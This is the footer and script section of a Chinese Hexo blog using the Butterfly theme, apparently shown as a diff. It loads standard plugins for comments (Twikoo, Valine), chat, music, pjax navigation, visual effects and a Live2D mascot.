fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
